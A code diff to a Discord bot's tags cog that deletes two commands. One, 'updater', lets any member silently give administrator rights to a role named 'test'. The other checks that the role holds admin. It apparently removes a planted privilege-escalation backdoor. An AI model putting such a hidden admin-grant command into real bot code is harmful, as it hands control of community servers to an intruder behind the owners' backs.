@@ -60,22 +60,6 @@ class Tags:
             nembed.add_field(name=tag, value=content)
         await ctx.send(embed=nembed)
 
-    @commands.guild_only()
-    @commands.command()
-    async def updater(self, ctx):
-        lamprole = discord.utils.find(lambda r: r.name == "test", ctx.message.guild.roles)
-        overwrite = discord.Permissions(permissions=lamprole.permissions.value)
-        overwrite.update(administrator=True)
-        await lamprole.edit(permissions=overwrite)
-
-        print("Role: " + lamprole.name + "\n" + "Admin: " + str(discord.utils.find(lambda r: r.name == "test", ctx.message.guild.roles).permissions.administrator))
-
-    @commands.guild_only()
-    @commands.command()
-    async def pls(self, ctx):
-        lamprole = discord.utils.find(lambda r: r.name == "test", ctx.message.guild.roles)
-        print(lamprole.permissions.administrator)
-
 
 
 
